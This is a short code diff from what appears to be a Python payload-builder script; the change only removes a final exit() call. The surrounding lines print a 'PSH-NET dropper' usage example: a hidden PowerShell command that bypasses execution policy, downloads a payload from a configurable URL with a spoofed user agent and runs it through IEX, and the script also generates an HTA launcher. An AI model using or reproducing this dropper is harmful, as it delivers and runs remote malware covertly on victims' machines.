@@ -245,4 +245,3 @@ if __name__=='__main__':
     obfuscate_payload(payload_filename)
     print("""PSH-NET dropper usage example:\npowershell.exe -Window Hidden -Nop -Exec Bypass -C "[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('""" + DownloadURL + payload_filename + """') -UserAgent '""" + UserAgent + """'|IEX" """)
     generate_hta(DownloadURL, UserAgent, payload_filename)
-    exit()
